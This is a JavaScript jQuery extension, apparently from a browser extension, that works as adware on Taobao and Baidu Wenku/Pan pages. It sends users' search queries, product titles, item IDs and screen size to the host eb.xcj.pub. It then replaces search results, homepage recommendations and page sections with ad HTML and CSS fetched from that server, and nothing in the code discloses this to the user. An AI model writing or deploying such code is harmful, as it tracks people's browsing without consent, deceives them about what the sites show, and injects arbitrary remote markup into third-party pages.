$.extend({
	queryUrlParamterTag:function(text, tag) { //查询GET请求url中的参数
		if(text.indexOf("?")!=-1){ //选取?后面的字符串,兼容window.location.search，前面的?不能去掉
			var textArray = text.split("?");
			text = "?"+textArray[textArray.length-1];
		}
		var t = new RegExp("(^|&)" + tag + "=([^&]*)(&|$)");
		var a = text.substr(1).match(t);
		if (a != null){
			return a[2];
		}
		return "";
	},
	request___show_q:function(requestUrl, params){
		params.size = screen.width+"*"+screen.height;
		params.version = "100"; //初始请求版本为100
		var resutData = null;
		var priceFilter = "";
		
		//如果采取的价格过滤，则服务器端过滤
		$(".J_SortbarPriceInput").each(function(){
			var value = $(this).val();
			priceFilter += "(" + (!!value ? parseInt(value) : "") + ")";
		});
		if(!!priceFilter){params.price = priceFilter;}
		
		$.ajax({
			type:"POST", url:requestUrl, dataType:"json", data:params, timeout:1500, async:false,
			success: function(result){
				var data = result.data;
				if(data!=null && data.length>0){
					resutData = data; 
				}
			},
		});
		return resutData;
	},
	dom___tbitem:function(requestRoot, scno){ //淘宝详情统计
		if(window.location.host!=="item.taobao.com" || window.location.href.indexOf("item.htm")==-1){
			return;
		}
		var goodsId = this.queryUrlParamterTag(window.location.search, "id");
		if(!!goodsId){
			$.get(requestRoot+"/ebusiness/api/tb/re/gitems?goodsId="+goodsId+"&platform=taobao&scno="+scno, function(result){});
		}
	},
	dom___home:function(requestRoot, scno){  //首页：猜你喜欢
		try{
			let that = this;
			if(window.location.host!=="www.taobao.com" || window.location.pathname!=="/"){
				return;
			}
			let isScanning = false;
			let windowSize = screen.width+"*"+screen.height;
			let dataObject = that.request___show_q(requestRoot+"/ebusiness/api/tb/h/ghobbies", {"scno":scno});
			
			let itemsInterval = setInterval(function(){
				if(isScanning) return;
				isScanning = true;
				let itemArray = $(".tbh-hotsale").find("div.item");
				if(itemArray.length!=0){
					clearInterval(itemsInterval);
					if(dataObject!=null){
						itemArray.each(function(){
							$(this).find("a.item-more").remove();
							for(var k=0; k<dataObject.length; k++){
								var dataObjectItem = dataObject[k];
								if(parseInt($(this).attr("aria-posinset"))===parseInt(dataObjectItem.index)){
									$(this).html(dataObjectItem.html);
								}
							}
						});
					}
				}
				isScanning = false;
			}, 100);
		}catch(e){}
	},
	dom___search:function(requestRoot, scno){ //搜索界面推广
		try{
			let that = this;
			if(window.location.host!=="s.taobao.com" || window.location.href.indexOf("://s.taobao.com/search")==-1){return;}
			
			//准备好提交参数
			let queryValue = this.queryUrlParamterTag(window.location.search, "q");
			if(!queryValue){return;}
							
			let dataObject = null;
			let isScanning = false;
			let dealredxNumber = 0;
			let scanningDelayTime = 50;
			
			setInterval(function(){
				if(isScanning){return;}
				
				//每一个循环都重置
				dealredxNumber = 0;
				isScanning = true;
				var itemArray = $("#mainsrp-itemlist").find("div.item");
				
				if(itemArray.length==0){
					isScanning = false; //标志位：扫描结束
					return;
				}
				
				itemArray.each(function(){  //获取处理过的item的个数
					if($(this).attr("dealredx")==="true"){
						dealredxNumber ++;
					}
				});
				if(dealredxNumber<5){  //未处理过，则加载服务器数据
					var titleArray = new Array();
					itemArray.each(function(){  //获取title
						try{
							var title = $(this).find("div.title").children("a.J_ClickStat").text();
							title = title.replace(/\t/g,"");
							title = title.replace(/\r/g,"");
							title = title.replace(/\n/g,"");
							title = title.replace(/\+/g,"%2B");//"+"
							title = title.replace(/\&/g,"%26");//"&"
							title = title.replace(/\#/g,"%23");//"#"
							title = title.replace(/\s/g,"");//"#"
							titleArray.push(title);
						}catch(e){}
					});
					
					//拼接title
					var titleConnectStr = titleArray.join("==============");
					dataObject = that.request___show_q(requestRoot+"/ebusiness/api/tb/s/gitems", {"q":queryValue, "titleConnectStr":titleConnectStr,"scno":scno});
					
					//正式处理插入广告
					itemArray.each(function(){  
						if($(this).attr("dealredx")==="true"){ //如果处理过则跳过
							return;
						}
						if(dataObject!=null){								
							for(var k=0; k<dataObject.length; k++){
								var dataObjectItem = dataObject[k];
								if(parseInt($(this).attr("data-index"))===parseInt(dataObjectItem.index)){
									if($(this).hasClass("item-ad")){ //暂时不触碰淘宝的广告位,遇到广告位自动往后移动
										dataObjectItem.index = (parseInt(dataObjectItem.index)+1)+"";
										return;
									}
									$(this).html(dataObjectItem.html);
								}
							}
						}
						$(this).attr("dealredx","true");
					});
				}
				
				//标志位：扫描结束
				isScanning = false;
			}, scanningDelayTime);
		}catch(e){}
	},
	dom___wjv:function(requestRoot, scno){ //文库+京东推广
		try{
			if(window.location.host==="wenku.baidu.com"
				&& (window.location.pathname.indexOf("/view/")!=-1 || window.location.pathname.indexOf("/link")!=-1)
				&& $(".vip-card-wrap-23223-new").length==0){
				$.get(requestRoot+"/api/card/find?tag=jd&no=1&scno="+scno, function(result){
					if(!!result && !!result.data){
						var resultData = result.data;
						var handler = resultData.handler;
						var html = resultData.html; var css = resultData.css;
						if(!!handler && !!html && !!css){
							$("body").prepend("<style>"+css+"</style>");
							var elementArray = handler.split("@");
							for(var i=0; i<elementArray.length; i++){
								var currentElement = elementArray[i];
								currentElement = currentElement.replace(/(^\s*)|(\s*$)/g,""); //去掉前后的空格
								if(!!currentElement){
									if($(currentElement).length!=0){
										$(currentElement).after(html)
									}else{
										let tryTimes = 0;
										let delayTime = 50; //毫秒
										let elementInterval = setInterval(function(){ //如果文库采用了异步加载，则循环检查
											if($(currentElement).length!=0){
												$(currentElement).after(html)
												clearInterval(elementInterval);
											}else{
												if(tryTimes*delayTime >= 10000){ //如果10s都还没有加载完成，则放弃此次加载
													clearInterval(elementInterval);
												}
											}
											tryTimes++;
										},delayTime);
									}
								}
							}
						}
					}
				});
			}
		}catch(e){}
	},
	dom___wpad:function(requestRoot, scno){
		if(window.location.host==="pan.baidu.com" && window.location.href.indexOf("/s/")!=-1){
			$.get(requestRoot+"/api/card/find?tag=wptext&no=1&scno="+scno, function(result){
				var data = result.data;
				if(!!data && !!data.css && !!data.html && !!data.handler){
					var handler = data.handler;
					var html = data.html;
					let helperInterval = setInterval(function(){
						var $headerUnion = $("#layoutHeader").find(handler);
						$headerUnion.hide();
						if($headerUnion.html().length >= 10){
							clearInterval(helperInterval);
							$headerUnion.html(html);
							$headerUnion.show();
						}
					},100);
				}
			});
			$.get(requestRoot+"/api/card/find?tag=wpimg&no=1&scno="+scno, function(result){
				var data = result.data;
				if(!!data && !!data.css && !!data.html && !!data.handler){
					var handler = data.handler;
					var html = data.html;
					let rightViewInterval = setInterval(function(){
						let $webRightView = $(handler);
						$webRightView.hide();
						if($webRightView.length==0){
							clearInterval(rightViewInterval);
							return;
						}
						if($webRightView.html().length>=10){
							clearInterval(rightViewInterval);
							$webRightView.html(html);
							$webRightView.show();
						}
					}, 100);
				}
			});
		}
	},
	domScanningElementj:function(){  //开始
		try{	
			let requestRoot = "https://eb.xcj.pub",scno = 1;;
			this.dom___home(requestRoot, scno);
			this.dom___search(requestRoot, scno);
			this.dom___tbitem(requestRoot, scno);
			this.dom___wjv(requestRoot, scno);
			this.dom___wpad(requestRoot, scno);
		}catch(e){}
	},
});